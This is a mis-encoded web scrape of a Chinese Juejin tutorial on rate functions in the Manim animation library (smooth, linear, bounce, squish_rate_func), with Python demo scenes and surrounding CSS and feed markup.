100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½ åœ¨åˆ¶ä½œManimåŠ¨ç”»æ—¶ï¼Œæ˜¯å¦é‡åˆ°è¿‡è¿™æ ·çš„å›°å¢ƒï¼Ÿ</p>
<p>â€œä»£ç å†™å¾—å¤©è¡£æ— ç¼ï¼Œè¿è¡Œæµç•…ï¼Œå‡ºæ¥çš„åŠ¨ç”»å´æ€»è§‰å¾—å“ªé‡Œä¸å¯¹åŠ²ï¼Ÿâ€</p>
<p>è™½ç„¶ç‰©ä½“ç¡®å®ä» A ç§»åŠ¨åˆ°äº† Bï¼Œä½†çœ‹èµ·æ¥å°±åƒæ˜¯è€æ—§çš„å·¥ä¸šæœºå™¨äººåœ¨å¹²æ´»â€”â€”åƒµç¡¬ã€æ­»æ¿ï¼Œç”šè‡³æœ‰ç‚¹æ— èŠã€‚</p>
<p>å…¶å®ï¼Œä½ çš„åŠ¨ç”»ç¦» <strong>â€œä¸æ»‘â€</strong> å’Œ <strong>â€œä¸“ä¸šâ€</strong>ï¼Œå¾€å¾€åªå·®è¿™ä¸€ä¸ªå‚æ•°çš„è·ç¦»ï¼š<code>rate_func</code> <strong>(é€Ÿç‡å‡½æ•°)</strong>ã€‚</p>
<p>ä»Šå¤©ï¼Œæˆ‘ä»¬å°±æ¥èŠèŠ Manim ä¸­è¿™ä¸ªä¸èµ·çœ¼ä½†è‡³å…³é‡è¦çš„å‚æ•°ï¼Œçœ‹çœ‹å¦‚ä½•é€šè¿‡æ§åˆ¶ <strong>â€œæ—¶é—´çš„æµé€Ÿâ€</strong>ï¼Œè®©ä½ çš„æ•°å­¦åŠ¨ç”»ä¸ä»…èƒ½åŠ¨ï¼Œè€Œä¸”åŠ¨å¾—æœ‰èŠ‚å¥ã€æœ‰çµé­‚ã€‚</p>
<h2 data-id="heading-0">1. ä»€ä¹ˆæ˜¯ Rate Functionï¼Ÿï¼ˆç»™æ—¶é—´çš„è¿›åº¦æ¡ï¼‰</h2>
<p>åœ¨ <code>Manim</code> ä¸­ï¼Œå½“ä½ å†™ä¸‹ <code>.animate.shift(RIGHT)</code> æ—¶ï¼Œé»˜è®¤å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ</p>
<p>å¦‚æœä½ è§‰å¾—åŠ¨ç”»åªæ˜¯ç®€å•çš„â€œåœ¨ <code>Run Time</code> æ—¶é—´å†…ç§»åŠ¨è·ç¦» <code>RIGHT</code>â€ï¼Œé‚£åªå¯¹äº†ä¸€åŠã€‚<code>Rate Function</code> æœ¬è´¨ä¸Šæ˜¯<strong>åŠ¨ç”»å®Œæˆåº¦ä¸æ—¶é—´çš„å…³ç³»</strong>ã€‚</p>
<p>æƒ³è±¡ä¸€ä¸‹ä½ åœ¨çœ‹è§†é¢‘æ—¶çš„è¿›åº¦æ¡ï¼š</p>
<ul>
<li><strong>è¾“å…¥ (</strong><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"/><span class="mord mathnormal">t</span></span></span></span></span><strong>)</strong>ï¼šå½“å‰æ—¶é—´è¿‡å»äº†å¤šå°‘ï¼ˆä» 0 åˆ° 1ï¼Œä»£è¡¨ 0% åˆ° 100% çš„æ—¶é—´ï¼‰ã€‚</li>
<li><strong>è¾“å‡º (</strong><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(t)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">t</span><span class="mclose">)</span></span></span></span></span><strong>)</strong>ï¼šåŠ¨ç”»å®é™…ä¸Šå®Œæˆäº†å¤šå°‘ï¼ˆä» 0 åˆ° 1ï¼Œä»£è¡¨ 0% åˆ° 100% çš„è¿›åº¦ï¼‰ã€‚</li>
</ul>
<p><strong>é»˜è®¤çš„é­”æ³•</strong>ï¼š<code>Smooth</code></p>
<p>Manim çš„é»˜è®¤ <code>rate_func</code> æ˜¯ <code>smooth</code>ã€‚
è¿™ç¬¦åˆç‰©ç†ä¸–ç•Œçš„æƒ¯æ€§å®šå¾‹ï¼š<strong>èµ·æ­¥æ—¶æ…¢ï¼ˆåŠ é€Ÿï¼‰ï¼Œä¸­é—´å¿«ï¼Œå¿«ç»“æŸæ—¶æ…¢ï¼ˆå‡é€Ÿï¼‰</strong>ã€‚</p>
<p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆé»˜è®¤çš„åŠ¨ç”»çœ‹èµ·æ¥æ¯”è¾ƒè‡ªç„¶ã€‚</p>
<p>å¦‚æœæˆ‘ä»¬æŠŠå®ƒæ¢æˆ <code>linear</code>ï¼ˆçº¿æ€§ï¼‰ï¼Œç‰©ä½“å°±ä¼šç¬é—´ä»¥æœ€å¤§é€Ÿåº¦å¯åŠ¨ï¼Œæœ€åç¬é—´æ€¥åœï¼Œçœ‹èµ·æ¥å°±ä¼šå¾ˆåƒ <strong>â€œPPT åŠ¨ç”»â€</strong>ã€‚</p>
<h2 data-id="heading-1">2. å¸¸ç”¨å‡½æ•°å›¾é‰´ï¼šé€‰å¯¹â€œè°ƒå‘³æ–™â€</h2>
<p><code>Manim</code>å†…ç½®äº†ä¸€å¤§å †å†™å¥½çš„å‡½æ•°ï¼Œä½äº <code>manim.utils.rate_functions</code>ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥æŠŠå®ƒä»¬çœ‹ä½œæ˜¯ç»™åŠ¨ç”»è°ƒå‘³çš„é¦™æ–™ã€‚</p>
<p>ä¸ºäº†æ–¹ä¾¿æ¼”ç¤ºï¼Œæˆ‘ä»¬å‡è®¾æˆ‘ä»¬è¦ç§»åŠ¨ä¸€ä¸ªå°çƒã€‚</p>
<h3 data-id="heading-2">2.1. åŸºç¡€ä¸‰å‰‘å®¢</h3>
<ul>
<li><code>linear</code> <strong>(åŒ€é€Ÿ)</strong>
<ul>
<li><strong>æ•ˆæœ</strong>ï¼šæœºæ¢°æ„Ÿå¼ºï¼Œé€Ÿåº¦æ’å®šã€‚</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šæ—‹è½¬çš„é½¿è½®ã€å¾ªç¯æ»šåŠ¨çš„èƒŒæ™¯ã€åŒ€é€Ÿæ‰«æçš„é›·è¾¾ã€‚</li>
</ul>
</li>
<li><code>smooth</code> <strong>(é»˜è®¤)</strong>
<ul>
<li><strong>æ•ˆæœ</strong>ï¼šä¸¤å¤´æ…¢ï¼Œä¸­é—´å¿«ã€‚</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šç»å¤§å¤šæ•°ç‰©ä½“çš„ç§»åŠ¨ã€ç¼©æ”¾ã€‚</li>
</ul>
</li>
<li><code>rush_into</code> / <code>rush_from</code>
<ul>
<li><strong>æ•ˆæœ</strong>ï¼š
<ul>
<li><code>rush_into</code>: è¶Šèµ°è¶Šå¿«ï¼Œæœ€åâ€œç °â€åœ°æ’çº¿ï¼ˆåªæœ‰åŠ é€Ÿï¼‰ã€‚</li>
<li><code>rush_from</code>: ä¸€å¼€å§‹å¾ˆå¿«ï¼Œæ…¢æ…¢åœä¸‹æ¥ï¼ˆåªæœ‰å‡é€Ÿï¼‰ã€‚</li>
</ul>
</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šè¿ç»­åŠ¨ä½œçš„è¡”æ¥ã€‚æ¯”å¦‚å°çƒé£å…¥ç”»é¢åœä¸‹ï¼ˆ<code>rush_from</code>ï¼‰ï¼Œæˆ–è€…å‘å°„å‡ºå»ï¼ˆ<code>rush_into</code>ï¼‰ã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-3">2.2. åŠ¨æ„Ÿç‰¹æ•ˆç»„</h3>
<ul>
<li><code>there_and_back</code> <strong>(å¾€è¿”)</strong>
<ul>
<li><strong>æ•ˆæœ</strong>ï¼šèµ°åˆ°ç»ˆç‚¹ï¼ŒåˆåŸè·¯è¿”å›èµ·ç‚¹ã€‚</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šå¼ºè°ƒæŸä¸ªä¸œè¥¿ã€‚æ¯”å¦‚æŠŠå…¬å¼æ”¾å¤§ä¸€ä¸‹å†ç¼©å›å»ï¼Œå‘Šè¯‰è§‚ä¼—â€œçœ‹è¿™é‡Œï¼â€ã€‚</li>
</ul>
</li>
<li><code>wiggle</code> <strong>(æ‘†åŠ¨)</strong>
<ul>
<li><strong>æ•ˆæœ</strong>ï¼šåƒæœå†»ä¸€æ ·å·¦å³æ™ƒåŠ¨ä¸€ä¸‹ã€‚</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šè¡¨ç¤ºâ€œé”™è¯¯â€ã€â€œæ‹’ç»â€æˆ–è€…å¼•èµ·æ³¨æ„ã€‚</li>
</ul>
</li>
<li><code>running_start</code> <strong>(åŠ©è·‘)</strong>
<ul>
<li><strong>æ•ˆæœ</strong>ï¼šå…ˆå‘åé€€ä¸€ç‚¹ç‚¹ï¼Œç„¶åçŒ›åœ°å‘å‰å†²ã€‚</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šæƒ³è¦è¡¨ç°ç‰©ä½“å¾ˆæœ‰åŠ›é‡æ„Ÿï¼Œæˆ–è€…åƒå¡é€šç‰‡é‡Œçš„å†²åˆºæ•ˆæœã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-4">2.3. ç‰©ç†æ¨¡æ‹Ÿç»„</h3>
<ul>
<li><code>ease_out_bounce</code><strong>(è½åœ°åå¼¹)</strong>
<ul>
<li><strong>æ•ˆæœ</strong>ï¼šåƒç¯®çƒè½åœ°ä¸€æ ·ï¼Œåˆ°åº•éƒ¨åå¼¹è·³å‡ æ¬¡å†åœä¸‹ã€‚</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šæ–‡å­—æ‰è½ã€ç‰©ä½“è‡ªç”±è½ä½“ã€‚</li>
</ul>
</li>
</ul>
<h2 data-id="heading-5">3. åŠ¨æ‰‹å†™ä¸ª Demo</h2>
<p>å…‰è¯´ä¸ç»ƒå‡æŠŠå¼ã€‚ä¸‹é¢çš„ç¤ºä¾‹ä»£ç å¯ä»¥ç›´è§‚æ„Ÿå—ä¸åŒå‡½æ•°çš„åŒºåˆ«ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> manim <span class="hljs-keyword">import</span> *


<span class="hljs-keyword">class</span> <span class="hljs-title class_">RateFuncComparison</span>(<span class="hljs-title class_ inherited__">Scene</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">construct</span>(<span class="hljs-params">self</span>):
        <span class="hljs-comment"># å®šä¹‰æˆ‘ä»¬æƒ³å¯¹æ¯”çš„å‡½æ•°</span>
        funcs = [
            linear,
            smooth,
            rush_from,
            rush_into,
            there_and_back,
            rate_functions.ease_out_bounce,
        ]
        labels = [
            <span class="hljs-string">"Linear"</span>,
            <span class="hljs-string">"Smooth"</span>,
            <span class="hljs-string">"Rush Into"</span>,
            <span class="hljs-string">"Rush From"</span>,
            <span class="hljs-string">"There &amp; Back"</span>,
            <span class="hljs-string">"Bounce"</span>,
        ]

        <span class="hljs-comment"># åˆ›å»ºåœ†ç‚¹å’Œæ–‡å­—</span>
        group = VGroup()
        <span class="hljs-keyword">for</span> i, (func, label_text) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">zip</span>(funcs, labels)):
            dot = Dot(color=TEAL)
            label = Text(label_text, font_size=<span class="hljs-number">20</span>).next_to(dot, LEFT)
            row = VGroup(label, dot)
            group.add(row)

        <span class="hljs-comment"># ç«–ç›´æ’åˆ—</span>
        group.arrange(DOWN, buff=<span class="hljs-number">0.5</span>).to_edge(LEFT)
        self.add(group)

        <span class="hljs-comment"># åˆ¶ä½œåŠ¨ç”»ï¼šè®©æ‰€æœ‰ç‚¹åŒæ—¶å‘å³ç§»åŠ¨</span>
        <span class="hljs-comment"># æ³¨æ„ï¼šæˆ‘ä»¬åœ¨è¿™é‡Œåˆ†åˆ«æŒ‡å®šäº†ä¸åŒçš„ rate_func</span>
        anims = []
        <span class="hljs-keyword">for</span> item, func <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(group, funcs):
            dot = item[<span class="hljs-number">1</span>]  <span class="hljs-comment"># è·å–ç»„é‡Œçš„ Dot</span>
            anims.append(dot.animate(rate_func=func, run_time=<span class="hljs-number">3</span>).shift(RIGHT * <span class="hljs-number">4</span>))

        self.play(*anims)
</code></pre>
<p>è¿è¡Œåä½ ä¼šå‘ç°ï¼Œè™½ç„¶å¤§å®¶çš„ <code>run_time</code> éƒ½æ˜¯3ç§’ï¼Œç§»åŠ¨è·ç¦»ä¸€æ ·ï¼Œä½†â€œæ€§æ ¼â€æˆªç„¶ä¸åŒã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba75cc74f304474baa5bc441daa970b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764484065&amp;x-signature=tRI%2BaQnQbSKGg%2FU0%2B9Y7jkVccUU%3D" alt="" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-6">4. è¿›é˜¶ï¼šè‡ªå®šä¹‰ä¸æ—¶é—´æ‰­æ›²</h2>
<p>ä½œä¸ºä¼š <code>Python</code> çš„è€æ‰‹ï¼Œå¦‚æœå†…ç½®å‡½æ•°æ»¡è¶³ä¸äº†ä½ æ€ä¹ˆåŠï¼Ÿ</p>
<h3 data-id="heading-7">4.1. è‡ªå®šä¹‰å‡½æ•° (Lambdaå¤§æ³•)</h3>
<p><code>rate_func</code> æ¥å—ä»»ä½•ä¸€ä¸ª <code>Python</code> å‡½æ•°ã€‚</p>
<p>æ¯”å¦‚ï¼Œä½ æƒ³åšä¸€ä¸ªç®€å•çš„â€œå…ˆæ…¢åå¿«â€çš„åŠ é€Ÿæ•ˆæœï¼Œå¯ä»¥ç›´æ¥ç”¨ <code>Lambda</code>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># y = x^2ï¼Œå…¸å‹çš„åŠ é€Ÿæ›²çº¿</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomRateFuncDemo</span>(<span class="hljs-title class_ inherited__">Scene</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">construct</span>(<span class="hljs-params">self</span>):
        <span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªåœ†</span>
        circle = Circle(radius=<span class="hljs-number">0.5</span>, color=BLUE).shift(LEFT * <span class="hljs-number">2</span>)
        self.add(circle)

        <span class="hljs-comment"># ä½¿ç”¨è‡ªå®šä¹‰ rate_funcï¼ˆt**2ï¼‰è®©åœ†å‘å³ç§»åŠ¨</span>
        self.play(circle.animate(rate_func=<span class="hljs-keyword">lambda</span> t: t**<span class="hljs-number">2</span>).shift(RIGHT * <span class="hljs-number">4</span>), run_time=<span class="hljs-number">3</span>)
        self.wait()
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c07fdccfbf142568d474d62018e7bea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764484065&amp;x-signature=EOzMezuJmYbGmcZSqkTb%2F%2BWPbYs%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-8">4.2. æ—¶é—´æŒ¤å‹ (Squish Rate Func)</h3>
<p>è¿™æ˜¯ <code>Manim</code> ä¸­æœ€å¼ºå¤§çš„é»‘ç§‘æŠ€ä¹‹ä¸€ï¼š<code>squish_rate_func</code>ã€‚</p>
<p>å‡è®¾ä½ å†™äº†ä¸€ä¸ª <code>run_time=6</code> çš„åŠ¨ç”»ï¼Œä½†ä½ å¸Œæœ›æŸä¸ªç‰¹å®šçš„å˜æ¢ï¼ˆæ¯”å¦‚å˜è‰²ï¼‰ï¼Œ</p>
<p>åœ¨ç¬¬ <code>1.2</code> ç§’åˆ°ç¬¬ <code>3</code> ç§’ä¹‹é—´ï¼ˆå³æ•´ä¸ªè¿›åº¦çš„ <code>0.2</code> åˆ° <code>0.5</code>ï¼‰ç”±<strong>ç™½è‰²</strong>å˜æˆ<strong>çº¢è‰²</strong>ï¼›</p>
<p>åœ¨ç¬¬ <code>3</code> ç§’åˆ°ç¬¬ <code>4.8</code> ç§’ä¹‹é—´ï¼ˆå³æ•´ä¸ªè¿›åº¦çš„ <code>0.5</code> åˆ° <code>0.8</code>ï¼‰ç”±<strong>çº¢è‰²</strong>å˜æˆ<strong>ç»¿è‰²</strong>ã€‚</p>
<p>ä½ ä¸éœ€è¦æŠŠåŠ¨ç”»æ‹†æˆå¤šæ®µå†™ï¼Œåªéœ€è¦ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SquishRateFuncDemo</span>(<span class="hljs-title class_ inherited__">Scene</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">construct</span>(<span class="hljs-params">self</span>):
        <span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªåœ†ç‚¹</span>
        dot = Dot(color=WHITE).shift(LEFT * <span class="hljs-number">2</span>)
        self.add(dot)

        <span class="hljs-comment"># ä½¿ç”¨UpdateFromAlphaFuncæ¥åŒæ—¶æ§åˆ¶ä½ç½®å’Œé¢œè‰²å˜åŒ–</span>
        <span class="hljs-keyword">def</span> <span class="hljs-title function_">update_dot</span>(<span class="hljs-params">obj, alpha</span>):
            <span class="hljs-comment"># ä½ç½®å˜åŒ– - ä½¿ç”¨é»˜è®¤çš„linearé€Ÿç‡</span>
            obj.move_to(LEFT * <span class="hljs-number">2</span> + RIGHT * <span class="hljs-number">5</span> * alpha)

            <span class="hljs-comment"># é¢œè‰²å˜åŒ– - ä½¿ç”¨squish_rate_funcæ§åˆ¶å˜è‰²çš„æ—¶é—´æ®µ</span>
            squished_alpha = squish_rate_func(smooth, <span class="hljs-number">0.2</span>, <span class="hljs-number">0.5</span>)(alpha)
            squished_alpha2 = squish_rate_func(smooth, <span class="hljs-number">0.5</span>, <span class="hljs-number">0.8</span>)(alpha)

            <span class="hljs-keyword">if</span> alpha &lt; <span class="hljs-number">0.5</span>:
                obj.set_color(interpolate_color(WHITE, RED, squished_alpha))
            <span class="hljs-keyword">else</span>:
                obj.set_color(interpolate_color(RED, GREEN, squished_alpha2))

        self.play(
            UpdateFromAlphaFunc(dot, update_dot),
            run_time=<span class="hljs-number">6</span>,
        )
        self.wait()
</code></pre>
<p>è¿™ä¸ªæŠ€å·§åœ¨åˆ¶ä½œå¤æ‚çš„å¤šé‡åŒæ­¥åŠ¨ç”»æ—¶éå¸¸æœ‰æ•ˆï¼</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4cb02575866740e7bbb2979d4f804ddc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764484065&amp;x-signature=3Y3bARnc7xdiRnomMl05wftOnVg%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-9">5. æ€»ç»“</h2>
<p><code>Manim</code> ä¸ä»…ä»…æ˜¯åŠ¨ç”»å·¥å…·ï¼Œå®ƒæ›´åƒæ˜¯ä¸€ä¸ªå¯¼æ¼”å·¥å…·ã€‚</p>
<ul>
<li><code>linear</code> æ˜¯ä¸ºäº†è¡¨ç°æœºæ¢°ã€å¾ªç¯ã€‚</li>
<li><code>smooth</code> æ˜¯ä¸ºäº†è¡¨ç°è‡ªç„¶ã€ç‰©ç†ã€‚</li>
<li><code>there_and_back</code> / <code>wiggle</code> æ˜¯ä¸ºäº†å¼•å¯¼è§‚ä¼—çš„æ³¨æ„åŠ›ã€‚</li>
<li><code>squish_rate_func</code> æ˜¯ä¸ºäº†ç²¾å‡†æ§åˆ¶æ—¶é—´è½´ã€‚</li>
</ul>
<p>ä¸‹æ¬¡å½“ä½ çš„åŠ¨ç”»çœ‹èµ·æ¥ç•¥æ˜¾ç”Ÿç¡¬æ—¶ï¼Œä¸å¦¨åœä¸‹æ¥æƒ³ä¸€æƒ³ï¼š<em>â€œè¿™ä¸ªåŠ¨ä½œçš„èŠ‚å¥å¯¹å—ï¼Ÿæ˜¯ä¸æ˜¯è¯¥æ¢ä¸ª rate function äº†ï¼Ÿâ€</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åŸºäºHologresæ„å»ºå¤šæ¨¡æ€AIæ•°æ®åˆ†æä¸æ£€ç´¢ç³»ç»Ÿ]]></title>    <link>https://juejin.cn/post/7576105458806882304</link>    <guid>https://juejin.cn/post/7576105458806882304</guid>    <pubDate>2025-11-24T10:33:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576105458806882304" data-draft-id="7576086446459797539" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åŸºäºHologresæ„å»ºå¤šæ¨¡æ€AIæ•°æ®åˆ†æä¸æ£€ç´¢ç³»ç»Ÿ"/> <meta itemprop="keywords" content="æ•°æ®åˆ†æ"/> <meta itemprop="datePublished" content="2025-11-24T10:33:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿é‡Œäº‘å¤§æ•°æ®AIæŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/2414974667341287"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åŸºäºHologresæ„å»ºå¤šæ¨¡æ€AIæ•°æ®åˆ†æä¸æ£€ç´¢ç³»ç»Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2414974667341287/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿é‡Œäº‘å¤§æ•°æ®AIæŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T10:33:02.000Z" title="Mon Nov 24 2025 10:33:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
